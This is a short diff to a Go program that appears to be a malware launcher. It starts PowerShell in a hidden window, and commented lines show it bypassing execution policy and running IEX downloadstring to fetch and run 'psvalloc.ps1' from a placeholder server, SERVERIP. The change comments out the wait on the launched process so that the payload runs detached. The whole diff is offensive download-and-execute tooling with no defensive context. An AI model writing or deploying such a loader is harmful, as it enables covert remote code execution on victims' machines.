@@ -35,7 +35,7 @@ func main() {
 		//cmd := exec.Command(`c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`, "-ep", "bypass", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/psvalloc.ps1'))")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		err = cmd.Start()
-		cmd.Wait()
+		//cmd.Wait()
 	} else {
 		//fmt.Println("32 bit")
 		cmdName := `PowerShell`
@@ -46,7 +46,7 @@ func main() {
 		//cmd := exec.Command("PowerShell", "-Command", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/psvalloc.ps1'))")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		err = cmd.Start()
-		cmd.Wait()
+		//cmd.Wait()
 	}
 
 	if err != nil {
